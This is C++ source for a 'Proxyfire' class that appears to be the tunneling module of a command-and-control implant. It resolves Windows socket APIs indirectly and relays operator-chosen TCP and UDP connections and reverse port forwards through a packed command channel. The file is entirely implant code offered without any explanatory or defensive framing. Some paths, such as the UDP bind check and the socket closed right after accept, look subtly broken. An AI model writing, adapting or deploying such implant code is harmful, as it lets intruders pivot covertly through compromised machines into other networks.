#include "Proxyfire.h"

void PackProxyStatus(Packer* packer, ULONG channelId, ULONG commandId, BOOL result)
{
	packer->Pack32(channelId);
	packer->Pack32(commandId);
	packer->Pack8(result);
}

void PackProxyData(Packer* packer, ULONG channelId, BYTE* data, ULONG dataSize )
{
	packer->Pack32(channelId);
	packer->Pack32(COMMAND_TUNNEL_WRITE_TCP);
	packer->PackBytes(data, dataSize);
}

void Proxyfire::AddProxyData(ULONG channelId, SOCKET sock, ULONG waitTime, ULONG mode, ULONG address, WORD port, ULONG state)
{
	TunnelData tunnelData = { 0 };
	tunnelData.channelID = channelId;
	tunnelData.sock      = sock;
	tunnelData.waitTime  = waitTime;
	tunnelData.mode      = mode;
	tunnelData.state     = state;
	tunnelData.i_address = address;
	tunnelData.port      = port;
	tunnelData.startTick = ApiWin->GetTickCount();
	this->tunnels.push_back(tunnelData);
}

//////////

SOCKET listenSocket(u_short port, int stream)
{
	WSAData WSAData;
	if (ApiWin->WSAStartup(514u, &WSAData) < 0)
		return -1;

	SOCKET sock = ApiWin->socket(AF_INET, SOCK_STREAM, 0);
	if (sock == -1)
		return -1;

	struct sockaddr_in saddr = { 0 };
	saddr.sin_family = AF_INET;
	saddr.sin_port = _htons(port);

	u_long argp = 1;
	int result = ApiWin->ioctlsocket(sock, FIONBIO, &argp);
	if (result != -1) {

		result = ApiWin->bind(sock, (struct sockaddr*)&saddr, sizeof(sockaddr));
		if (result != -1) {

			result = ApiWin->listen(sock, stream);
			if (result != -1) {
				return sock;
			}
		}
	}
	ApiWin->closesocket(sock);
	return -1;
}

void Proxyfire::ConnectMessageTCP(ULONG channelId, CHAR* address, WORD port, Packer* outPacker)
{
	WSAData wsaData;
	if (ApiWin->WSAStartup(514, &wsaData)) {
		ApiWin->WSACleanup();
		return;
	}
	else {
		SOCKET sock = ApiWin->socket(AF_INET, SOCK_STREAM, 0);
		if (sock != -1) {
			hostent* host = ApiWin->gethostbyname(address);
			if (host) {
				sockaddr_in socketAddress;
				memcpy(&socketAddress.sin_addr, *(const void**)host->h_addr_list, host->h_length); 				//memmove
				socketAddress.sin_family = AF_INET;
				socketAddress.sin_port = _htons(port);
				u_long mode = 1;
				if (ApiWin->ioctlsocket(sock, FIONBIO, &mode) != -1) {
					if (!(ApiWin->connect(sock, (sockaddr*) &socketAddress, 16) == -1 && ApiWin->WSAGetLastError() != WSAEWOULDBLOCK)) {
						this->AddProxyData(channelId, sock, 30000, TUNNEL_MODE_SEND_TCP, 0, 0, TUNNEL_STATE_CONNECT);
						return;
					}
				}
			}
		}
		ApiWin->closesocket(sock);
		PackProxyStatus(outPacker, channelId, COMMAND_TUNNEL_START_TCP, FALSE);
	}
}

void Proxyfire::ConnectMessageUDP(ULONG channelId, CHAR* address, WORD port, Packer* outPacker)
{
	WSAData wsaData;
	if (ApiWin->WSAStartup(514, &wsaData)) {
		ApiWin->WSACleanup();
		return;
	}
	else {
		SOCKET sock = ApiWin->socket(AF_INET, SOCK_DGRAM, 0);
		if (sock != -1) {
			hostent* host = ApiWin->gethostbyname(address);
			if (host) {
				ULONG addr = 0;
				memcpy(&addr, *(const void**)host->h_addr_list, 4); 				//memmove
				sockaddr_in socketAddress;
				socketAddress.sin_family = AF_INET;
				if (ApiWin->bind(sock, (sockaddr*)&socketAddress, sizeof(socketAddress)) < 0) {
					u_long mode = 1;
					if (ApiWin->ioctlsocket(sock, FIONBIO, &mode) != -1) {
						this->AddProxyData(channelId, sock, 30000, TUNNEL_MODE_SEND_UDP, addr, port, TUNNEL_STATE_CONNECT);
						return;
					}
				}
			}
		}
		ApiWin->closesocket(sock);
		PackProxyStatus(outPacker, channelId, COMMAND_TUNNEL_START_TCP, FALSE);
	}
}

void Proxyfire::ConnectWriteTCP(ULONG channelId, CHAR* data, ULONG dataSize)
{
	TunnelData* tunnelData;
	for (int i = 0; i < tunnels.size(); i++) {
		tunnelData = &(this->tunnels[i]);
		if (tunnelData->channelID == channelId && tunnelData->state == TUNNEL_STATE_READY) {
			DWORD finishTick = ApiWin->GetTickCount() + 30000;
			timeval timeout = { 0, 100 };
			fd_set exceptfds;
			fd_set writefds;
			
			while (ApiWin->GetTickCount() < finishTick) {
				writefds.fd_array[0] = tunnelData->sock;
				writefds.fd_count = 1;
				exceptfds.fd_array[0] = writefds.fd_array[0];
				exceptfds.fd_count = 1;
				ApiWin->select(0, 0, &writefds, &exceptfds, &timeout);
				if (ApiWin->__WSAFDIsSet(tunnelData->sock, &exceptfds))
					break;
				if (ApiWin->__WSAFDIsSet(tunnelData->sock, &writefds)) {
					if (ApiWin->send(tunnelData->sock, data, dataSize, 0) != -1 || ApiWin->WSAGetLastError() != WSAEWOULDBLOCK)
						return;
					ApiWin->Sleep(1000);
				}
			}
			break;
		}
	}
	tunnelData = NULL;
}

void Proxyfire::ConnectWriteUDP(ULONG channelId, CHAR* data, ULONG dataSize)
{
	TunnelData* tunnelData;
	for (int i = 0; i < tunnels.size(); i++) {
		tunnelData = &(this->tunnels[i]);
		if ( tunnelData->channelID == channelId && tunnelData->state == TUNNEL_STATE_READY ) {
			DWORD finishTick = ApiWin->GetTickCount() + 30000;
			timeval timeout = { 0, 100 };
			fd_set exceptfds;
			fd_set writefds;
			while (ApiWin->GetTickCount() < finishTick) {
				writefds.fd_array[0] = tunnelData->sock;
				writefds.fd_count = 1;
				exceptfds.fd_array[0] = writefds.fd_array[0];
				exceptfds.fd_count = 1;
				ApiWin->select(0, 0, &writefds, &exceptfds, &timeout);
				if (ApiWin->__WSAFDIsSet(tunnelData->sock, &exceptfds))
					break;
				if (ApiWin->__WSAFDIsSet(tunnelData->sock, &writefds)) {
					sockaddr_in addr_to;
					addr_to.sin_family = AF_INET;
					addr_to.sin_port = _htons(tunnelData->port);
					addr_to.sin_addr.S_un.S_addr = tunnelData->i_address;

					ApiWin->sendto(tunnelData->sock, data, dataSize, 0, (const struct sockaddr*)&addr_to, 16);
				}
			}
			break;
		}
	}
	tunnelData = NULL;
}

void Proxyfire::ConnectClose(ULONG channelId)
{
	TunnelData* tunnelData;
	for (int i = 0; i < tunnels.size(); i++) {
		tunnelData = &(this->tunnels[i]);
		if (tunnelData->channelID == channelId && tunnelData->state != TUNNEL_STATE_CLOSE) {
			tunnelData->state = TUNNEL_STATE_CLOSE;
			break;
		}
	}
	tunnelData = NULL;
}

void Proxyfire::ConnectMessageReverse(ULONG tunnelId, WORD port, Packer* outPacker)
{
	for (int i = 0; i < tunnels.size(); i++) {
		if (this->tunnels[i].mode == TUNNEL_MODE_REVERSE_TCP && this->tunnels[i].port == port && this->tunnels[i].state != TUNNEL_STATE_CLOSE) {
			PackProxyStatus(outPacker, tunnelId, COMMAND_TUNNEL_REVERSE, FALSE);
			return;
		}
	}

	SOCKET sock = listenSocket(port, 10);
	if (sock == -1) {
		PackProxyStatus(outPacker, tunnelId, COMMAND_TUNNEL_REVERSE, FALSE);
		return;
	}
	
	this->AddProxyData(tunnelId, sock, 0, TUNNEL_MODE_REVERSE_TCP, 0, port, TUNNEL_STATE_CONNECT);

	PackProxyStatus(outPacker, tunnelId, COMMAND_TUNNEL_REVERSE, TRUE);
}

///////////////////

void Proxyfire::CheckProxy(Packer* packer)
{
	TunnelData* tunnelData;
	timeval timeout = { 0, 100 };
	for (int i = 0; i < this->tunnels.size(); i++) {
		tunnelData = &(this->tunnels[i]);
		if (tunnelData->state == TUNNEL_STATE_CONNECT) {
			ULONG channelId = tunnelData->channelID;
			fd_set readfds;
			readfds.fd_count = 1;
			readfds.fd_array[0] = tunnelData->sock;
			fd_set exceptfds;
			exceptfds.fd_count = 1;
			exceptfds.fd_array[0] = tunnelData->sock;
			fd_set writefds;
			writefds.fd_count = 1;
			writefds.fd_array[0] = tunnelData->sock;
			ApiWin->select(0, &readfds, &writefds, &exceptfds, &timeout);
			
			if ( tunnelData->mode == TUNNEL_MODE_REVERSE_TCP ) {

				if (ApiWin->__WSAFDIsSet(tunnelData->sock, &readfds)) {
					SOCKET sock = ApiWin->accept(tunnelData->sock, 0, 0);
					u_long mode = 1;
					if (ApiWin->ioctlsocket(sock, FIONBIO, &mode) == -1) {
						ApiWin->closesocket(sock);
						continue;
					}

					ULONG cid = GenerateRandom32();

					packer->Pack32(tunnelData->channelID); // tunnel ID
					packer->Pack32(COMMAND_TUNNEL_ACCEPT);
					packer->Pack32(cid);

					this->AddProxyData(cid, sock, 180000, TUNNEL_MODE_SEND_TCP, 0, 0, TUNNEL_STATE_READY);
				}
			}
			else {
				if (tunnelData->mode == TUNNEL_MODE_SEND_UDP) {
					if (ApiWin->__WSAFDIsSet(tunnelData->sock, &exceptfds)) {
						tunnelData->state = TUNNEL_STATE_CLOSE;
						PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, FALSE);
						continue;
					}
					if (ApiWin->__WSAFDIsSet(tunnelData->sock, &writefds)) {
						tunnelData->state = TUNNEL_STATE_READY;
						PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, TRUE);
						continue;
					}
				}
				else {
					if (tunnelData->mode == TUNNEL_MODE_SEND_TCP) {
						if (ApiWin->__WSAFDIsSet(tunnelData->sock, &exceptfds)) {
							tunnelData->state = TUNNEL_STATE_CLOSE;
							PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, FALSE);
							continue;
						}
						if (ApiWin->__WSAFDIsSet(tunnelData->sock, &writefds)) {
							tunnelData->state = TUNNEL_STATE_READY;
							PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, TRUE);
							continue;
						}
						if (ApiWin->__WSAFDIsSet(tunnelData->sock, &readfds)) {
							SOCKET tmp_sock_2 = ApiWin->accept(tunnelData->sock, 0, 0);
							tunnelData->sock = tmp_sock_2;
							if (tmp_sock_2 == -1) {
								tunnelData->state = TUNNEL_STATE_CLOSE;
								PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, FALSE);
							}
							else {
								tunnelData->state = TUNNEL_STATE_READY;
								PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, TRUE);
							}
							ApiWin->closesocket(tunnelData->sock);
							continue;
						}
					}
				}
				if (ApiWin->GetTickCount() - tunnelData->startTick > tunnelData->waitTime) {
					tunnelData->state = TUNNEL_STATE_CLOSE;
					PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, FALSE);
				}
			}
		}
	}
	tunnelData = NULL;
}

ULONG Proxyfire::RecvProxy(Packer* packer)
{
	ULONG count = 0;
	TunnelData* tunnelData;
	for ( int i = 0; i < this->tunnels.size(); i++ ) {
		tunnelData = &(this->tunnels[i]);
		if (tunnelData->state == TUNNEL_STATE_READY) {
			if (tunnelData->mode == TUNNEL_MODE_SEND_UDP) {

				LPVOID buffer = MemAllocLocal(0xFFFFC);
				struct sockaddr_in clientAddr = { 0 };
				int clientAddrLen = sizeof(sockaddr_in);

				int readed = ApiWin->recvfrom(tunnelData->sock, (CHAR*) buffer, 0xFFFFC, 0, (struct sockaddr*)&clientAddr, &clientAddrLen);
				if (readed == -1) {
					if (ApiWin->WSAGetLastError() != WSAEWOULDBLOCK) {
						tunnelData->state = TUNNEL_STATE_CLOSE;
						PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, FALSE);
 				   }
				}
				else if (readed) {
					PackProxyData(packer, tunnelData->channelID, (PBYTE)buffer, readed);
					++count;
				}
				MemFreeLocal(&buffer, 0xFFFFC);
			}
			else {
				ULONG dataLength = 0;
				int result = ApiWin->ioctlsocket(tunnelData->sock, FIONREAD, &dataLength);
				if (dataLength > 0xFFFFC)
					dataLength = 0xFFFFC;
				if (result == -1) {
					tunnelData->state = TUNNEL_STATE_CLOSE;
					PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, FALSE);
				}
				else {
					if (dataLength) {
						LPVOID buffer = MemAllocLocal(dataLength);
						ULONG readed = ReadFromSocket(tunnelData->sock, (PCHAR)buffer, dataLength);
						if (readed == -1) {
							tunnelData->state = TUNNEL_STATE_CLOSE;
							PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, FALSE);
						}
						if (readed == dataLength) {
							PackProxyData(packer, tunnelData->channelID, (PBYTE)buffer, dataLength);
							++count;
						}
						MemFreeLocal(&buffer, dataLength);
					}
				}
			}
		}
	}
	tunnelData = NULL;
	return count;
}

void Proxyfire::CloseProxy()
{
	TunnelData* tunnelData;
	for (int i = 0; i < this->tunnels.size(); i++) {
		tunnelData = &(this->tunnels[i]);
		if (tunnelData->state == TUNNEL_STATE_CLOSE) {
			
			if (tunnelData->closeTimer == 0) {
				tunnelData->closeTimer = ApiWin->GetTickCount();
				continue;
			}

			if (tunnelData->closeTimer + 1000 < ApiWin->GetTickCount()) {
				if (tunnelData->mode == TUNNEL_MODE_SEND_TCP || tunnelData->mode == TUNNEL_MODE_SEND_UDP)
					ApiWin->shutdown(tunnelData->sock, 2);
				
				if (ApiWin->closesocket(tunnelData->sock) && tunnelData->mode == TUNNEL_MODE_REVERSE_TCP)
					continue;

				this->tunnels.remove(i);
				--i;
			}
		}
	}
	tunnelData = NULL;
}

void Proxyfire::ProcessTunnels(Packer* packer)
{
	if (!this->tunnels.size())
		return;

	this->CheckProxy(packer);

	ULONG finishTick = ApiWin->GetTickCount() + 2500;
	while ( this->RecvProxy(packer) && ApiWin->GetTickCount() < finishTick );

	this->CloseProxy();
}